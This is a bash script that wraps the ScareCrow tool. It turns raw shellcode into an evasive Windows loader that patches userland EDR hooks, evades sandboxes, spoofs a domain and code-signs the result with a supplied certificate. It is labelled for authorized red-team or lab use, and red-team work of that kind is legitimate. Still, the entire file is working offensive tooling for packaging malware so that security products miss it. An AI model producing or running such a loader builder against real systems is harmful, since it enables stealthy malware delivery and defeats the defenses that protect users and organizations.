#!/usr/bin/env bash

# scarecrow.sh - ScareCrow loader wrapper
# -----------------------------------------------------------------------------
# Wraps the installed ScareCrow tool to turn raw shellcode (e.g. from
# payload-forge.sh stage 1/2) into a loader that loads a clean DLL, patches
# userland EDR hooks, and signs the output. Runs ScareCrow with sensible
# defaults and shows the command.
# -----------------------------------------------------------------------------
# AUTHORIZED RED-TEAM / LAB use only. The output is a real evasive loader.
# -----------------------------------------------------------------------------
#
# USAGE:
#   ./scarecrow.sh -i <shellcode.bin> [-O dll|exe] [-d <domain_to_spoof>] [-o <name>]
#   -i  Input shellcode file (required)
#   -O  Output type: "dll" (default) or "exe"
#   -d  Domain to spoof (optional)
#   -o  Base name for output file (optional; extension added automatically)
#   -h  Show this help message
#
# EXAMPLE:
#   ./scarecrow.sh -i shellcode.bin -O exe -d example.com -o payload
#
# NOTE: Signing is performed automatically if the environment variable
# SC_SIGN_CERT points to a code‑signing certificate (PFX/PEM). The script uses
# "osslsigncode" for signing. Adjust the signing command if you prefer another
# tool.

set -euo pipefail

# Function to display usage information
usage() {
  grep '^#' "$0" | sed -e 's/^# //'
  exit 1
}

# Default values
OUTPUT_TYPE="dll"
OUTPUT_NAME=""
DOMAIN_SPOOF=""

# Parse command‑line arguments
while getopts ":i:O:d:o:h" opt; do
  case $opt in
    i)
      INPUT_FILE="$OPTARG"
      ;;
    O)
      if [[ "$OPTARG" != "dll" && "$OPTARG" != "exe" ]]; then
        echo "Error: -O must be 'dll' or 'exe'"
        usage
      fi
      OUTPUT_TYPE="$OPTARG"
      ;;
    d)
      DOMAIN_SPOOF="$OPTARG"
      ;;
    o)
      OUTPUT_NAME="$OPTARG"
      ;;
    h)
      usage
      ;;
    \?)
      echo "Invalid option: -$OPTARG"
      usage
      ;;
    :) 
      echo "Option -$OPTARG requires an argument."
      usage
      ;;
  esac
done

# Verify required input
if [[ -z "${INPUT_FILE-}" ]]; then
  echo "Error: Input file (-i) is required."
  usage
fi
if [[ ! -f "$INPUT_FILE" ]]; then
  echo "Error: Input file '$INPUT_FILE' does not exist."
  exit 1
fi

# Determine output file name
if [[ -z "$OUTPUT_NAME" ]]; then
  # Use input basename without extension
  BASENAME=$(basename "${INPUT_FILE%.*}")
  OUTPUT_NAME="$BASENAME"
fi
OUTPUT_FILE="${OUTPUT_NAME}.${OUTPUT_TYPE}"

# Build ScareCrow command with sensible defaults
SCAREROW_BIN="scarecrow"  # assumes ScareCrow is in PATH
SCAREROW_CMD=("$SCAREROW_BIN" -i "$INPUT_FILE" -O "$OUTPUT_TYPE")
# Add optional arguments
if [[ -n "$DOMAIN_SPOOF" ]]; then
  SCAREROW_CMD+=("-d" "$DOMAIN_SPOOF")
fi
SCAREROW_CMD+=("-o" "$OUTPUT_FILE")
# Additional default flags for sandbox evasion and EDR patching (adjust as needed)
SCAREROW_CMD+=("-s" "-p")

# Show the full command for reproducibility
echo "[+] Executing ScareCrow command: ${SCAREROW_CMD[*]}"

# Run ScareCrow
"${SCAREROW_CMD[@]}"

# Optional signing step
if [[ -n "${SC_SIGN_CERT-}" ]]; then
  if command -v osslsigncode >/dev/null 2>&1; then
    SIGNED_OUTPUT="${OUTPUT_NAME}_signed.${OUTPUT_TYPE}"
    echo "[+] Signing output with certificate at '$SC_SIGN_CERT'"
    osslsigncode sign -certs "$SC_SIGN_CERT" -in "$OUTPUT_FILE" -out "$SIGNED_OUTPUT"
    echo "[+] Signed file created: $SIGNED_OUTPUT"
  else
    echo "[!] Signing requested but 'osslsigncode' not found in PATH. Skipping signing."
  fi
fi

echo "[+] Done. Produced $OUTPUT_FILE"